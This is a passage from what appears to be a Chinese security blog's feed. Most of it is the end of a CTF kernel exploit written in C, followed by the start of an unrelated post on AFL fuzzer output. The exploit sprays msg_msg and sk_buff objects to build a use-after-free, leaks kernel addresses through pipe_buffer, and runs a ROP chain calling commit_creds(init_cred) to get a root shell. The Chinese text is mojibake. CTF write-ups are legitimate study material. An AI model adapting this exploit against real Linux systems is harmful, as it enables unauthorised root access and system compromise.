class="string">&quot;\n\033[34m\033[1m[*] spray msg_msg, construct overlapping object\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(&amp;primary_msg, <span class="number">0</span>, <span class="keyword">sizeof</span>(primary_msg));</span><br><span class="line">    <span class="built_in">memset</span>(&amp;secondary_msg, <span class="number">0</span>, <span class="keyword">sizeof</span>(secondary_msg));</span><br><span class="line">    *(<span class="keyword">long</span> *)&amp;primary_msg = PRIMARY_MSG_TYPE;</span><br><span class="line">    *(<span class="keyword">long</span> *)&amp;secondary_msg = SECONDARY_MSG_TYPE;</span><br><span class="line">    *(<span class="keyword">int</span> *)&amp;primary_msg.mtext[<span class="number">0</span>] = MSG_TAG;</span><br><span class="line">    *(<span class="keyword">int</span> *)&amp;secondary_msg.mtext[<span class="number">0</span>] = MSG_TAG;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; MSG_QUEUE_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        *(<span class="keyword">int</span> *)&amp;primary_msg.mtext[<span class="number">0</span>] = MSG_TAG;</span><br><span class="line">        *(<span class="keyword">int</span> *)&amp;primary_msg.mtext[<span class="number">4</span>] = i;</span><br><span class="line">        <span class="keyword">if</span> (msgsnd(msqid[i], &amp;primary_msg,</span><br><span class="line">                   <span class="keyword">sizeof</span>(primary_msg) - <span class="number">8</span>, <span class="number">0</span>) &lt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            errExit(<span class="string">&quot;failed to send primary msg!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        *(<span class="keyword">int</span> *)&amp;secondary_msg.mtext[<span class="number">0</span>] = MSG_TAG;</span><br><span class="line">        *(<span class="keyword">int</span> *)&amp;secondary_msg.mtext[<span class="number">4</span>] = i;</span><br><span class="line">        <span class="keyword">if</span> (msgsnd(msqid[i], &amp;secondary_msg,</span><br><span class="line">                   <span class="keyword">sizeof</span>(secondary_msg) - <span class="number">8</span>, <span class="number">0</span>) &lt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            errExit(<span class="string">&quot;failed to send secondary msg!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; MSG_QUEUE_NUM; i += <span class="number">1024</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (msgrcv(msqid[i], &amp;primary_msg, <span class="keyword">sizeof</span>(primary_msg) - <span class="number">8</span>, PRIMARY_MSG_TYPE, <span class="number">0</span>) &lt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            errExit(<span class="string">&quot;failed to receive primary msg!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="number">0x84</span>, <span class="number">0x1000</span>);</span><br><span class="line">    write(fd, buf, <span class="number">0xffc</span>);</span><br><span class="line">    read(fd, buf, <span class="number">0xffc</span>);</span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="number">0x1000</span>);</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">short</span> *)buf = <span class="number">0xffd</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; SOCKET_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; SK_BUFF_NUM; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (write(sk_sockets[i][<span class="number">0</span>], buf, <span class="number">0x1000</span> - <span class="number">0x140</span>) &lt; <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                errExit(<span class="string">&quot;failed to spray sk_buff!&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="number">0xa0</span>, <span class="number">0x1000</span>);</span><br><span class="line">    write(fd, buf, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    victim_qid = real_qid = <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; MSG_QUEUE_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (i % <span class="number">256</span> == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (msgrcv(msqid[i], &amp;secondary_msg, <span class="keyword">sizeof</span>(secondary_msg) - <span class="number">8</span>, <span class="number">1</span>, MSG_COPY | IPC_NOWAIT) &lt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            errExit(<span class="string">&quot;failed to receive secondary msg!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (*(<span class="keyword">int</span> *)&amp;secondary_msg.mtext[<span class="number">0</span>] != MSG_TAG)</span><br><span class="line">        &#123;</span><br><span class="line">            errExit(<span class="string">&quot;failed to make corruption!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (*(<span class="keyword">int</span> *)&amp;secondary_msg.mtext[<span class="number">4</span>] != i)</span><br><span class="line">        &#123;</span><br><span class="line">            victim_qid = i;</span><br><span class="line">            real_qid = *(<span class="keyword">int</span> *)&amp;secondary_msg.mtext[<span class="number">4</span>];</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (victim_qid &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        errExit(<span class="string">&quot;failed to make overlapping!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; SOCKET_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; SK_BUFF_NUM; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (read(sk_sockets[i][<span class="number">1</span>], buf, <span class="number">0x1000</span> - <span class="number">0x140</span>) &lt; <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                errExit(<span class="string">&quot;failed to release sk_buff!&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] victim qid:\033[0m %d &quot;</span>, victim_qid);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m real qid: \033[0m %d\n&quot;</span>, real_qid);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (msgrcv(msqid[real_qid], &amp;secondary_msg, <span class="keyword">sizeof</span>(secondary_msg) - <span class="number">8</span>, SECONDARY_MSG_TYPE, <span class="number">0</span>) &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        errExit(<span class="string">&quot;failed to release secondary msg!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m\033[1m[+] UAF construction complete!\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\n\033[34m\033[1m[*] spray sk_buff to leak kheap addr\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(fake_secondary_msg, <span class="string">&#x27;Z&#x27;</span>, <span class="keyword">sizeof</span>(fake_secondary_msg));</span><br><span class="line">    ((struct msg_msg *)fake_secondary_msg)-&gt;m_list.next = <span class="number">0x196082</span>;</span><br><span class="line">    ((struct msg_msg *)fake_secondary_msg)-&gt;m_list.prev = <span class="number">0x196082</span>;</span><br><span class="line">    ((struct msg_msg *)fake_secondary_msg)-&gt;m_type = VICTIM_MSG_TYPE;</span><br><span class="line">    ((struct msg_msg *)fake_secondary_msg)-&gt;m_ts = <span class="number">0x1000</span> - <span class="keyword">sizeof</span>(struct msg_msg);</span><br><span class="line">    ((struct msg_msg *)fake_secondary_msg)-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">    ((struct msg_msg *)fake_secondary_msg)-&gt;security = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; SOCKET_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; SK_BUFF_NUM; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (write(sk_sockets[i][<span class="number">0</span>], fake_secondary_msg, <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                errExit(<span class="string">&quot;failed to spray sk_buff!&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (msgrcv(msqid[victim_qid], &amp;oob_msg, <span class="keyword">sizeof</span>(oob_msg) - <span class="number">8</span>, <span class="number">1</span>, MSG_COPY | IPC_NOWAIT) &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        errExit(<span class="string">&quot;failed to read victim msg!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (*(<span class="keyword">int</span> *)&amp;oob_msg.mtext[SECONDARY_MSG_SIZE] != MSG_TAG)</span><br><span class="line">    &#123;</span><br><span class="line">        errExit(<span class="string">&quot;failed to rehit the UAF object!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    nearby_msg = (struct msg_msg *)&amp;oob_msg.mtext[(SECONDARY_MSG_SIZE - <span class="keyword">sizeof</span>(struct msg_msg))];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] addr of primary msg of msg nearby victim: \033[0m%p\n&quot;</span>,</span><br><span class="line">           nearby_msg-&gt;m_list.prev);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; SOCKET_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; SK_BUFF_NUM; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (read(sk_sockets[i][<span class="number">1</span>], fake_secondary_msg, <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                errExit(<span class="string">&quot;failed to release sk_buff!&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    search_addr = (<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *)nearby_msg-&gt;m_list.prev;</span><br><span class="line">    search_addr = search_addr - <span class="number">8</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(oob_msg.mtext, <span class="number">0</span>, <span class="keyword">sizeof</span>(oob_msg.mtext));</span><br><span class="line"></span><br><span class="line">    ((struct msg_msg *)fake_secondary_msg)-&gt;m_list.next = <span class="literal">NULL</span>;</span><br><span class="line">    ((struct msg_msg *)fake_secondary_msg)-&gt;m_list.prev = <span class="literal">NULL</span>;</span><br><span class="line">    ((struct msg_msg *)fake_secondary_msg)-&gt;m_type = <span class="literal">NULL</span>;</span><br><span class="line">    ((struct msg_msg *)fake_secondary_msg)-&gt;m_ts = <span class="keyword">sizeof</span>(oob_msg.mtext);</span><br><span class="line">    ((struct msg_msg *)fake_secondary_msg)-&gt;next = search_addr;</span><br><span class="line">    ((struct msg_msg *)fake_secondary_msg)-&gt;security = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; SOCKET_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; SK_BUFF_NUM; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (write(sk_sockets[i][<span class="number">0</span>], fake_secondary_msg, <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                errExit(<span class="string">&quot;failed to spray sk_buff!&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (msgrcv(msqid[victim_qid], &amp;oob_msg, <span class="keyword">sizeof</span>(oob_msg), <span class="number">1</span>, MSG_COPY | IPC_NOWAIT) &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        errExit(<span class="string">&quot;failed to read victim msg!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (*(<span class="keyword">int</span> *)&amp;oob_msg.mtext[<span class="number">0x1000</span>] != MSG_TAG)</span><br><span class="line">    &#123;</span><br><span class="line">        errExit(<span class="string">&quot;failed to rehit the UAF object!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    nearby_msg_prim = (struct msg_msg *)&amp;oob_msg.mtext[<span class="number">0x1000</span> - <span class="keyword">sizeof</span>(struct msg_msg)];</span><br><span class="line">    victim_addr = (<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(nearby_msg_prim-&gt;m_list.next);</span><br><span class="line">    victim_addr = victim_addr - <span class="number">0x400</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] addr of msg UAF object: \033[0m%p\n&quot;</span>, victim_addr);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; SOCKET_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; SK_BUFF_NUM; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (read(sk_sockets[i][<span class="number">1</span>], fake_secondary_msg, <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                errExit(<span class="string">&quot;failed to release sk_buff!&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\n\033[34m\033[1m[*] spray pipe_buffer to leak kernel base\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">704</span> / <span class="number">8</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        ((<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *)fake_secondary_msg)[i] = victim_addr;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((struct msg_msg *)fake_secondary_msg)-&gt;m_list.next = victim_addr + <span class="number">0x200</span>;</span><br><span class="line">    ((struct msg_msg *)fake_secondary_msg)-&gt;m_list.prev = victim_addr + <span class="number">0x200</span>;</span><br><span class="line">    ((struct msg_msg *)fake_secondary_msg)-&gt;m_type = VICTIM_MSG_TYPE;</span><br><span class="line">    ((struct msg_msg *)fake_secondary_msg)-&gt;m_ts = <span class="number">1024</span> - <span class="number">0x30</span>;</span><br><span class="line">    ((struct msg_msg *)fake_secondary_msg)-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">    ((struct msg_msg *)fake_secondary_msg)-&gt;security = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; SOCKET_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; SK_BUFF_NUM; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (write(sk_sockets[i][<span class="number">0</span>], fake_secondary_msg, <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                errExit(<span class="string">&quot;failed to spray sk_buff!&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (msgrcv(msqid[victim_qid], &amp;secondary_msg, <span class="keyword">sizeof</span>(secondary_msg), VICTIM_MSG_TYPE, IPC_NOWAIT | MSG_NOERROR) &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        errExit(<span class="string">&quot;failed to read victim msg!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; PIPE_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (pipe(pipe_fd[i]) &lt; <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;failed to create pipe!&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (write(pipe_fd[i][<span class="number">1</span>], <span class="string">&quot;196082&quot;</span>, <span class="number">6</span>) &lt; <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;failed to write the pipe!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">memset</span>(fake_secondary_msg, <span class="number">0</span>, <span class="keyword">sizeof</span>(fake_secondary_msg));</span><br><span class="line">    pipe_buf_ptr = (struct pipe_buffer *)&amp;fake_secondary_msg;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; SOCKET_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; SK_BUFF_NUM; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (read(sk_sockets[i][<span class="number">1</span>], &amp;fake_secondary_msg,</span><br><span class="line">                     <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">                errExit(<span class="string">&quot;failed to release sk_buff!&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (pipe_buf_ptr-&gt;ops &gt; <span class="number">0xffffffff81000000</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] got pipe_buf_ops: \033[0m%p\n&quot;</span>,</span><br><span class="line">                       pipe_buf_ptr-&gt;ops);</span><br><span class="line">                kernel_addr = pipe_buf_ptr-&gt;ops;</span><br><span class="line">                kernel_offset = kernel_addr - <span class="number">0xffffffff81e2d980</span>;</span><br><span class="line">                kernel_base = kernel_offset + <span class="number">0xffffffff81000000</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] kernel base: \033[0m%p \033[32m\033[1moffset: \033[0m%p\n&quot;</span>,</span><br><span class="line">           kernel_base, kernel_offset);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\n\033[34m\033[1m[*] hijack the ops of pipe_buffer, gain root privilege\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> init_cred = <span class="number">0xffffffff8224aca0</span> + kernel_offset;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> commit_creds = <span class="number">0xffffffff810bb710</span> + kernel_offset;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> pop_rdi = <span class="number">0xffffffff811af57d</span> + kernel_offset;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> swapgs_iretq = <span class="number">0xffffffff81a010eb</span> + kernel_offset;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> push_rsi_pop_rsp_rbx_r12 = <span class="number">0xffffffff8133151b</span> + kernel_offset;</span><br><span class="line"></span><br><span class="line">    pipe_buf_ptr-&gt;page = *(<span class="keyword">uint64_t</span> *)<span class="string">&quot;196082&quot;</span>;</span><br><span class="line">    pipe_buf_ptr-&gt;ops = victim_addr + <span class="number">0x100</span>;</span><br><span class="line">    *(<span class="keyword">uint64_t</span> *)(fake_secondary_msg + <span class="number">0x18</span>) = <span class="number">0xffffffff81000390</span> + kernel_offset;</span><br><span class="line"></span><br><span class="line">    ops_ptr = (struct pipe_buf_operations *)&amp;fake_secondary_msg[<span class="number">0x100</span>];</span><br><span class="line">    ops_ptr-&gt;release = push_rsi_pop_rsp_rbx_r12;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> rop = <span class="number">0</span>;</span><br><span class="line">    rop_chain = (<span class="keyword">uint64_t</span> *)&amp;fake_secondary_msg[<span class="number">0x20</span>];</span><br><span class="line">    rop_chain[rop++] = pop_rdi;</span><br><span class="line">    rop_chain[rop++] = init_cred;</span><br><span class="line">    rop_chain[rop++] = commit_creds;</span><br><span class="line">    rop_chain[rop++] = swapgs_iretq;</span><br><span class="line">    rop_chain[rop++] = get_shell;</span><br><span class="line">    rop_chain[rop++] = user_cs;</span><br><span class="line">    rop_chain[rop++] = user_rflags;</span><br><span class="line">    rop_chain[rop++] = user_sp;</span><br><span class="line">    rop_chain[rop++] = user_ss;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;rop_chain is ready\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; SOCKET_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; SK_BUFF_NUM; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (write(sk_sockets[i][<span class="number">0</span>], fake_secondary_msg, <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                errExit(<span class="string">&quot;failed to spray sk_buff!&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    read(fd, buf, <span class="number">0xffc</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;spray sk_buff complete!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; PIPE_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        close(pipe_fd[i][<span class="number">0</span>]);</span><br><span class="line">        close(pipe_fd[i][<span class="number">1</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20230331103838088.png"                      alt="image-20230331103838088"                ></p><p>åæ§½ä¸€ä¸‹ï¼šä¸€é“é¢˜ç›®ç”¨äº†äº”ä¸ªgadgetæ–‡ä»¶ï¼ï¼ï¼</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">âœ  ctf ls -l | grep gadget</span><br><span class="line">-rw-r--r--   1 tcdy  staff   14478379  3 29 19:14 gadget.txt</span><br><span class="line">-rw-rw-r--@  1 tcdy  staff  325376514  3 29 19:24 gadget2.txt</span><br><span class="line">-rw-rw-r--@  1 tcdy  staff  113547117  3 30 13:43 gadget3.txt</span><br><span class="line">-rw-rw-r--@  1 tcdy  staff   21718691  3 30 14:38 gadget4.txt</span><br><span class="line">-rw-r--r--   1 tcdy  staff    4499639  3 30 15:08 gadget5.txt</span><br></pre></td></tr></table></figure><hr><p>å‚è€ƒé“¾æ¥:<br>    <a class="link"   href="https://arttnba3.cn/2022/09/30/CTF-0X07-BYTECTF2022_BYTERUN/" >https://arttnba3.cn/2022/09/30/CTF-0X07-BYTECTF2022_BYTERUN/<i class="fas fa-external-link-alt"></i></a><br>    <a class="link"   href="https://elixir.bootlin.com/linux/v5.19/source/ipc/msg.c#L1068" >https://elixir.bootlin.com/linux/v5.19/source/ipc/msg.c#L1068<i class="fas fa-external-link-alt"></i></a><br>é¢˜ç›®é“¾æ¥:<br>    å¢¨æ™šé¸¢ä½¬è‡ªå·±æœ‰é¢˜ç›®é“¾æ¥ï¼Œè¿™é‡Œå°±ä¸ä¸Šä¼ å•¦ã€‚</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;å½“åˆçœ‹åˆ°å¢¨æ™šé¸¢å¤§ä½¬çš„åšå®¢å¯¹è¿™é“é¢˜ç›®çš„æè¿°çš„æ—¶å€™å°±å¯¹è¿™é“é¢˜æš—ç”Ÿæƒ…æ„«äº†ï¼Œå¦‚ä»Šç»ˆäºæ˜¯å¾—ä»¥å¤ç°ã€‚&lt;/p&gt;
&lt;h2 id=&quot;å†…æ ¸åˆ†æ&quot;&gt;&lt;a href=&quot;#å†…æ ¸åˆ†æ&quot; class=&quot;headerlink&quot; title=&quot;å†…æ ¸åˆ†æ&quot;&gt;&lt;/a&gt;å†…æ ¸åˆ†æ&lt;/h2&gt;&lt;h3 id=&quot;å‡½æ•°åˆ†æ&quot;</summary>
      
    
    
    
    <category term="æ¯”èµ›å¤ç°" scheme="https://cv196082.gitee.io/categories/%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="msg_msg" scheme="https://cv196082.gitee.io/tags/msg-msg/"/>
    
    <category term="sk_buff" scheme="https://cv196082.gitee.io/tags/sk-buff/"/>
    
    <category term="pipe_buffer" scheme="https://cv196082.gitee.io/tags/pipe-buffer/"/>
    
    <category term="qemu escape" scheme="https://cv196082.gitee.io/tags/qemu-escape/"/>
    
  </entry>
  
  <entry>
    <title>FUZZ(2):AFLç»“æœåˆ†æå’Œä»£ç è¦†ç›–ç‡</title>
    <link href="https://cv196082.gitee.io/2023/03/23/AFL%E7%BB%93%E6%9E%9C%E5%88%86%E6%9E%90%E5%92%8C%E4%BB%A3%E7%A0%81%E8%A6%86%E7%9B%96%E7%8E%87/"/>
    <id>https://cv196082.gitee.io/2023/03/23/AFL%E7%BB%93%E6%9E%9C%E5%88%86%E6%9E%90%E5%92%8C%E4%BB%A3%E7%A0%81%E8%A6%86%E7%9B%96%E7%8E%87/</id>
    <published>2023-03-23T13:47:34.000Z</published>
    <updated>2023-03-23T13:47:18.753Z</updated>
    
    <content type="html"><![CDATA[<p>æœ¬æ¥ä¸æ‰“ç®—åšAFLçš„æºç åˆ†æï¼Œä½†æ˜¯çœ‹åˆ°äº†ä¸€ç¯‡æ–‡ç« å¸å¼•åˆ°äº†æˆ‘ï¼Œå½“ç„¶è¿™ç¯‡æ–‡ç« è¿˜æ˜¯ä¸ä¼šæ¶‰åŠåˆ°æºç åˆ†æï¼Œåœ¨åç»­çš„FUZZç›¸å…³æ–‡ç« ä¸­ä¼šè¿›è¡Œè¿›ä¸€æ­¥åˆ†æã€‚</p><h2 id="fuzzerå·¥ä½œçŠ¶æ€"><a href="#fuzzerå·¥ä½œçŠ¶æ€" class="headerlink" title="fuzzerå·¥ä½œçŠ¶æ€"></a>fuzzerå·¥ä½œçŠ¶æ€</h2><p>é¦–å…ˆå¯ä»¥æŸ¥çœ‹åœ¨<code>output</code>ç›®å½•ä¸‹çš„<code>fuzzer_state</code>æ–‡ä»¶ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">âœ  afl-2.52b cat ./afl_test/output_dir/fuzzer_stats</span><br><span class="line">start_time        : 1679542022</span><br><span class="line">last_update       : 1679542022</span><br><span class="line">fuzzer_pid        : 541718</span><br><span class="line">cycles_done       : 